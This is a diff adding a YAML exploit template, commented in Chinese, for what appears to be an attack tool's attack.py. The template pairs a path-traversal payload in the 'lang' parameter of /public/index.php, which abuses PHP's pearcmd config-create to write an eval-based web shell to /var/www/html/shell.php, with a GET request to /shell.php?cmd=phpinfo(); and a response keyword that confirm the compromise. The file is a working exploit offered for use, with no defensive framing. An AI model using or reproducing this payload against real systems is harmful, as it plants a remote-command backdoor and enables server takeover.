@@ -1,0 +1,28 @@
+#种类：exp对应的是attack.py
+- type:
+  - type: "exp"
+
+#请求方式
+- method:
+  - method: "post"
+
+#payload
+- payload:
+  - lang: "../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['cmd']);?>+/var/www/html/shell.php"
+
+#response包里的关键字
+- word:
+  - word:
+      - "php_dir"
+
+#漏洞的位置
+- url:
+  - url : "/public/index.php"
+
+#attack中 验证 是否攻击成功的 请求方式
+- method-V:
+  - method: "get"
+
+#webshell位置
+- verify:
+  - verify : "/shell.php?cmd=phpinfo();"
